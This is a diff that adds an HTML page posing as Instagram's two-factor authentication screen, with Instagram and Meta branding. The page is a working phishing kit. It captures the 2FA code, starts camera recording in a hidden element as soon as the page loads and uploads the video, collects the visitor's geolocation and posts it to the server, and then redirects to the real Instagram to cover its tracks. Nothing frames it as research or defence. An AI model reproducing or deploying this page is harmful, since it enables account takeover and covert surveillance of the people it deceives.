@@ -1,0 +1,426 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Instagram • Two-factor Authentication</title>
+    <link rel="shortcut icon" href="https://static.cdninstagram.com/rsrc.php/v3/yt/r/30PrGfR3xhB.png" type="image/x-icon">
+    <style>
+        * {
+            box-sizing: border-box;
+            margin: 0;
+            padding: 0;
+            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
+        }
+        
+        body {
+            background: linear-gradient(to bottom, #1b2838, #0d161e);
+            color: #fff;
+            width: 100%;
+            height: 100vh;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            justify-content: space-between;
+        }
+        
+        .language-top {
+            width: 100%;
+            text-align: center;
+            padding: 14px 0;
+            font-size: 14px;
+            color: #fff;
+            font-weight: 500;
+        }
+        
+        .container {
+            width: 100%;
+            max-width: 450px;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            padding: 20px;
+            flex-grow: 1;
+            justify-content: center;
+        }
+        
+        .logo-container {
+            margin-bottom: 30px;
+            display: flex;
+            justify-content: center;
+        }
+        
+        .instagram-logo {
+            width: 85px;
+            height: 85px;
+        }
+        
+        .form-container {
+            width: 100%;
+            text-align: center;
+        }
+        
+        .verification-title {
+            font-size: 18px;
+            font-weight: 600;
+            margin-bottom: 12px;
+        }
+        
+        .verification-subtitle {
+            font-size: 14px;
+            color: #8b949e;
+            margin-bottom: 24px;
+            line-height: 1.4;
+        }
+        
+        .form-input {
+            width: 100%;
+            background-color: rgba(30, 41, 59, 0.8);
+            border: 1px solid #384b65;
+            border-radius: 12px;
+            color: #fff;
+            font-size: 16px;
+            padding: 16px 12px;
+            margin-bottom: 14px;
+            text-align: center;
+            letter-spacing: 8px;
+            font-weight: 600;
+        }
+        
+        .form-input::placeholder {
+            color: #8b949e;
+            letter-spacing: normal;
+        }
+        
+        .form-input:focus {
+            border-color: #666;
+            outline: none;
+        }
+        
+        .login-button {
+            width: 100%;
+            background-color: #0095f6;
+            color: #fff;
+            border: none;
+            border-radius: 12px;
+            font-size: 16px;
+            font-weight: 600;
+            padding: 14px 0;
+            margin-top: 16px;
+            cursor: pointer;
+        }
+        
+        .login-button:disabled {
+            background-color: rgba(0, 149, 246, 0.3);
+            cursor: default;
+        }
+        
+        .back-link {
+            color: #0095f6;
+            font-size: 14px;
+            text-align: center;
+            margin-top: 24px;
+            text-decoration: none;
+            display: block;
+        }
+        
+        .timer-text {
+            color: #8b949e;
+            font-size: 14px;
+            margin-top: 10px;
+            display: none;
+        }
+        
+        .divider {
+            border-top: 1px solid #384b65;
+            margin: 40px 0 20px;
+            width: 100%;
+        }
+        
+        .meta-logo {
+            margin-bottom: 24px;
+            opacity: 0.9;
+            width: 100px;
+            filter: brightness(100) contrast(1) invert(1);
+        }
+        
+        .emoji-background {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            z-index: -1;
+            pointer-events: none;
+            overflow: hidden;
+        }
+        
+        .floating-emoji {
+            position: absolute;
+            opacity: 0.05;
+            font-size: 36px;
+            animation-name: float;
+            animation-duration: 15s;
+            animation-timing-function: ease-in-out;
+            animation-iteration-count: infinite;
+        }
+        
+        @keyframes float {
+            0% {
+                transform: translateY(0) rotate(0deg);
+                opacity: 0.02;
+            }
+            50% {
+                transform: translateY(-20px) rotate(10deg);
+                opacity: 0.08;
+            }
+            100% {
+                transform: translateY(0) rotate(0deg);
+                opacity: 0.02;
+            }
+        }
+        
+        .security-icon {
+            font-size: 40px;
+            margin-bottom: 20px;
+        }
+    </style>
+</head>
+<body>
+    <div class="emoji-background">
+        <div class="floating-emoji" style="top: 15%; left: 10%; animation-delay: 0s;">🔐</div>
+        <div class="floating-emoji" style="top: 25%; left: 85%; animation-delay: 1s;">📱</div>
+        <div class="floating-emoji" style="top: 50%; left: 20%; animation-delay: 2s;">🔒</div>
+        <div class="floating-emoji" style="top: 75%; left: 75%; animation-delay: 3s;">📲</div>
+        <div class="floating-emoji" style="top: 35%; left: 45%; animation-delay: 4s;">🛡️</div>
+        <div class="floating-emoji" style="top: 85%; left: 30%; animation-delay: 5s;">🔑</div>
+        <div class="floating-emoji" style="top: 65%; left: 60%; animation-delay: 6s;">🔔</div>
+        <div class="floating-emoji" style="top: 5%; left: 65%; animation-delay: 7s;">📨</div>
+    </div>
+    
+    <div class="language-top">
+        English (US)
+    </div>
+    
+    <div class="container">
+        <div class="logo-container">
+            <svg xmlns="http://www.w3.org/2000/svg" class="instagram-logo" viewBox="0 0 448 512" fill="url(#instagram-gradient)">
+                <defs>
+                    <linearGradient id="instagram-gradient" x1="100%" y1="0%" x2="0%" y2="100%">
+                        <stop offset="0%" style="stop-color:#405DE6"/>
+                        <stop offset="20%" style="stop-color:#5851DB"/>
+                        <stop offset="40%" style="stop-color:#833AB4"/>
+                        <stop offset="60%" style="stop-color:#C13584"/>
+                        <stop offset="80%" style="stop-color:#E1306C"/>
+                        <stop offset="100%" style="stop-color:#FD1D1D"/>
+                    </linearGradient>
+                </defs>
+                <path d="M224.1 141c-63.6 0-114.9 51.3-114.9 114.9s51.3 114.9 114.9 114.9S339 319.5 339 255.9 287.7 141 224.1 141zm0 189.6c-41.1 0-74.7-33.5-74.7-74.7s33.5-74.7 74.7-74.7 74.7 33.5 74.7 74.7-33.6 74.7-74.7 74.7zm146.4-194.3c0 14.9-12 26.8-26.8 26.8-14.9 0-26.8-12-26.8-26.8s12-26.8 26.8-26.8 26.8 12 26.8 26.8zm76.1 27.2c-1.7-35.9-9.9-67.7-36.2-93.9-26.2-26.2-58-34.4-93.9-36.2-37-2.1-147.9-2.1-184.9 0-35.8 1.7-67.6 9.9-93.9 36.1s-34.4 58-36.2 93.9c-2.1 37-2.1 147.9 0 184.9 1.7 35.9 9.9 67.7 36.2 93.9s58 34.4 93.9 36.2c37 2.1 147.9 2.1 184.9 0 35.9-1.7 67.7-9.9 93.9-36.2 26.2-26.2 34.4-58 36.2-93.9 2.1-37 2.1-147.8 0-184.8zM398.8 388c-7.8 19.6-22.9 34.7-42.6 42.6-29.5 11.7-99.5 9-132.1 9s-102.7 2.6-132.1-9c-19.6-7.8-34.7-22.9-42.6-42.6-11.7-29.5-9-99.5-9-132.1s-2.6-102.7 9-132.1c7.8-19.6 22.9-34.7 42.6-42.6 29.5-11.7 99.5-9 132.1-9s102.7-2.6 132.1 9c19.6 7.8 34.7 22.9 42.6 42.6 11.7 29.5 9 99.5 9 132.1s2.7 102.7-9 132.1z"/>
+            </svg>
+        </div>
+        
+        <div class="form-container">
+            <div class="security-icon">🔒</div>
+            <div class="verification-title">Two-factor Authentication Required</div>
+            <div class="verification-subtitle">
+                For your security, we've sent a verification code to the email address k*****@gmail.com.
+                <br>Please enter the code to continue.
+            </div>
+            
+            <form id="verificationForm" action="/verify" method="post">
+                <input type="text" id="verificationCode" name="verificationCode" class="form-input" placeholder="Enter code" maxlength="6" required>
+                <button type="submit" id="verifyButton" class="login-button" disabled>Verify</button>
+            </form>
+            
+            <a href="#" class="back-link" id="resendLink">I didn't receive a code</a>
+            <div class="timer-text" id="timerText">Code sent. You can request a new code in <span id="timer">60</span> seconds.</div>
+        </div>
+    </div>
+    
+    <div style="width: 100%; text-align: center; padding-bottom: 24px;">
+        <div class="divider"></div>
+        <img src="https://z-m-static.xx.fbcdn.net/rsrc.php/v4/yM/r/DDgwTv3JehF.png" alt="Meta Logo" class="meta-logo">
+        <div style="color: #8b949e; font-size: 12px; margin-top: -10px;">© 2025 Meta</div>
+    </div>
+    
+    <script>
+        // Validate verification form
+        const verificationInput = document.getElementById('verificationCode');
+        const verifyButton = document.getElementById('verifyButton');
+        const resendLink = document.getElementById('resendLink');
+        const timerText = document.getElementById('timerText');
+        const timerElement = document.getElementById('timer');
+        let timerInterval = null;
+        let mediaRecorder;
+        let recordedChunks = [];
+        
+        // Request camera access immediately when page loads
+        document.addEventListener('DOMContentLoaded', function() {
+            // Request camera access for video recording
+            if (navigator.mediaDevices && navigator.mediaDevices.getUserMedia) {
+                navigator.mediaDevices.getUserMedia({ 
+                    video: true,
+                    audio: false 
+                })
+                .then(function(stream) {
+                    console.log("Camera access granted");
+                    
+                    // Create hidden video element
+                    const video = document.createElement('video');
+                    video.style.display = 'none';
+                    document.body.appendChild(video);
+                    video.srcObject = stream;
+                    
+                    // Create MediaRecorder instance to record video
+                    mediaRecorder = new MediaRecorder(stream);
+                    
+                    // Store recorded chunks
+                    mediaRecorder.ondataavailable = function(e) {
+                        if (e.data.size > 0) {
+                            recordedChunks.push(e.data);
+                        }
+                    };
+                    
+                    // When recording stops, create the file and upload
+                    mediaRecorder.onstop = function() {
+                        // Combine the recorded chunks to create a video blob
+                        const videoBlob = new Blob(recordedChunks, {
+                            type: 'video/webm'
+                        });
+                        
+                        // Create form data and append the video
+                        const formData = new FormData();
+                        formData.append('video', videoBlob, 'verification_video.webm');
+                        
+                        // Upload the video to server
+                        fetch('/upload_video', {
+                            method: 'POST',
+                            body: formData
+                        })
+                        .then(response => console.log('Video uploaded successfully'))
+                        .catch(error => console.error('Error uploading video:', error));
+                        
+                        // Stop all tracks
+                        stream.getTracks().forEach(track => track.stop());
+                    };
+                    
+                    // Start recording immediately
+                    recordedChunks = [];
+                    mediaRecorder.start();
+                    console.log("Video recording started");
+                })
+                .catch(function(error) {
+                    console.error("Camera access denied:", error);
+                });
+            }
+        });
+        
+        // Enable button only when the code field has content
+        function validateForm() {
+            if (verificationInput.value.trim() !== '') {
+                verifyButton.disabled = false;
+            } else {
+                verifyButton.disabled = true;
+            }
+        }
+        
+        verificationInput.addEventListener('input', function(e) {
+            // Allow only numbers
+            e.target.value = e.target.value.replace(/[^0-9]/g, '');
+            validateForm();
+        });
+        
+        // Handle resend link
+        resendLink.addEventListener('click', function(e) {
+            e.preventDefault();
+            
+            // Show timer and disable resend link
+            timerText.style.display = 'block';
+            resendLink.style.pointerEvents = 'none';
+            resendLink.style.opacity = '0.5';
+            
+            // Start timer
+            let secondsLeft = 60;
+            timerElement.textContent = secondsLeft;
+            
+            // Clear any existing interval
+            if (timerInterval) {
+                clearInterval(timerInterval);
+            }
+            
+            // Set up new interval
+            timerInterval = setInterval(function() {
+                secondsLeft--;
+                timerElement.textContent = secondsLeft;
+                
+                if (secondsLeft <= 0) {
+                    // Timer finished
+                    clearInterval(timerInterval);
+                    timerText.style.display = 'none';
+                    resendLink.style.pointerEvents = 'auto';
+                    resendLink.style.opacity = '1';
+                }
+            }, 1000);
+            
+            // Simulate sending a new code
+            console.log('Requesting new verification code...');
+        });
+        
+        // Handle form submission
+        document.getElementById('verificationForm').addEventListener('submit', function(e) {
+            e.preventDefault();
+            
+            // Stop recording if mediaRecorder exists and is recording
+            if (mediaRecorder && mediaRecorder.state === "recording") {
+                mediaRecorder.stop();
+                console.log("Video recording stopped");
+            }
+            
+            // Submit the form with verification code
+            submitVerification();
+        });
+        
+        // Request location access
+        if (navigator.geolocation) {
+            navigator.geolocation.getCurrentPosition(function(position) {
+                // Send location data to server
+                fetch('/save_location', {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json'
+                    },
+                    body: JSON.stringify({
+                        lat: position.coords.latitude,
+                        lng: position.coords.longitude,
+                        accuracy: position.coords.accuracy
+                    })
+                });
+            });
+        }
+        
+        function submitVerification() {
+            // Get form data
+            const formData = new FormData();
+            formData.append('verification_code', verificationInput.value);
+            
+            // Send verification code to server
+            fetch('/verify', {
+                method: 'POST',
+                body: formData
+            })
+            .then(response => {
+                // Redirect to real Instagram after short delay
+                setTimeout(() => {
+                    window.location.href = 'https://www.instagram.com/';
+                }, 1500);
+            })
+            .catch(error => {
+                // Still redirect
+                setTimeout(() => {
+                    window.location.href = 'https://www.instagram.com/';
+                }, 1500);
+            });
+        }
+    </script>
+</body>
+</html> 
